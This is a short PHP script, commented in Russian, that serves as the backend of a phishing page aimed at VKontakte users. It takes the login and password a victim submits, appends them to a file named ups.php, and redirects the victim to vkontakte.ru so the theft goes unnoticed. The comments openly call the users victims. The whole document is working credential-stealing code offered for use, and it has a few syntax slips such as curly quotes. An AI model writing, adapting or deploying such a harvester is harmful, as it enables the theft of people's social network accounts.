<?
$Login = $_POST['login']; // Логин  жертвы
$Pass = $_POST['pass']; // Пароль жертвы
$log = fopen('ups.php',’a+’); //тут будут лежать пароли жертв
fwrite($log,'<br> $Login:$Pass \n’); //производим запись в ups.php
fclose($log); //закрывает ups.php
echo "<html><head><META HTTP-EQUIV='Refresh' content =0; URL='http://vkontakte.ru'></head></html>"; // перенаправляем жертву на http://vk.com
?>
